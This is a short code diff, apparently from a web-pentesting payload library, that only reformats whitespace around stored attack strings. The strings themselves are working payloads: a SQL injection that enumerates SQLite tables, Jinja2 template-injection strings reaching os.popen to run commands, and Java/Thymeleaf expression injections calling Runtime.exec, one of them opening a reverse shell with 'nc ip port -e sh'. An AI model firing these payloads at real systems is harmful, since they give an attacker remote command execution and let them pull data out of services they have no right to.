@@ -152,7 +152,7 @@ window.Payload.SQLi = {
       fields[position - 1] = 'group_concat(name)'
 
       return 'union select ' + fields.join(',') +
-      " from sqlite_master WHERE type='table'"
+        " from sqlite_master WHERE type='table'"
     },
 
     dumpColumns: ({ columns, position }) => {
@@ -181,7 +181,7 @@ window.Payload.LFI = {
 }
 
 window.Payload.SSTI = {
-  Jinja2:{
+  Jinja2: {
     tuple2Class: value => "{{().__class__.__base__.__subclasses__()}}",
     string2Class: value => "{{''.__class__.mro()[1].__subclasses__()}}",
     list2Class: value => "{{[].__class__.__base__.__subclasses__()}}",
@@ -191,8 +191,8 @@ window.Payload.SSTI = {
     "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
     // todo : add features to bypass filter keywords like __ '' "" []
   },
-  Java:{
+  Java: {
     thymeleafRCE: value => '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
-    commonRCE:value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
+    commonRCE: value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
   }
 }
